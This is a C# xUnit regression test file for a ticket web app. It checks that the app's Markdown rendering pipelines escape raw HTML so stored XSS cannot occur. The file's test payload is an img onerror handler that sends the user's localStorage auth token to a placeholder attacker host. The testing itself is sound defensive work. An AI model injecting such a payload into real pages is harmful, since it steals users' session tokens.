using System.Reflection;
using Markdig;
using THWTicketApp.Web.Components;
using THWTicketApp.Web.Pages;

namespace THWTicketApp.Tests.Components;

/// <summary>
/// Security regression guard for the stored-XSS fixes (issues #191, #195, #198).
/// Comments, notes, issue bodies and report content are all attacker-controllable
/// and rendered via (MarkupString)Markdown.ToHtml(...). Each production Markdig
/// pipeline must therefore call .DisableHtml() so raw HTML is escaped instead of
/// passed through to the DOM. These tests reach the actual private static pipeline
/// fields by reflection, so removing DisableHtml() from any sink fails here.
/// </summary>
public class MarkdownXssTests
{
    private const string Payload =
        "<img src=x onerror=\"fetch('https://evil.example/'+localStorage.getItem('auth_token'))\">";

    public static IEnumerable<object[]> Pipelines =>
        new[]
        {
            new object[] { GetPipeline(typeof(TicketActivityFeed), "_md") },
            new object[] { GetPipeline(typeof(Reports), "_mdPipeline") },
            new object[] { GetPipeline(typeof(TicketDetail), "_mdPipeline") },
        };

    [Theory]
    [MemberData(nameof(Pipelines))]
    public void Pipeline_escapes_raw_html_payload(MarkdownPipeline pipeline)
    {
        var html = Markdown.ToHtml(Payload, pipeline);

        // The dangerous handler must not survive as live markup.
        Assert.DoesNotContain("<img", html);
        Assert.DoesNotContain("onerror=\"fetch", html);
        // It must be present, but escaped as literal text.
        Assert.Contains("&lt;img", html);
    }

    [Theory]
    [MemberData(nameof(Pipelines))]
    public void Pipeline_still_renders_legitimate_markdown(MarkdownPipeline pipeline)
    {
        var html = Markdown.ToHtml("**bold**", pipeline);
        Assert.Contains("<strong>bold</strong>", html);
    }

    private static MarkdownPipeline GetPipeline(Type componentType, string fieldName)
    {
        var field = componentType.GetField(fieldName, BindingFlags.NonPublic | BindingFlags.Static)
            ?? throw new InvalidOperationException(
                $"Expected private static Markdig pipeline field '{fieldName}' on {componentType.Name}. " +
                "If it was renamed, update this XSS regression test accordingly.");
        return (MarkdownPipeline)field.GetValue(null)!;
    }
}
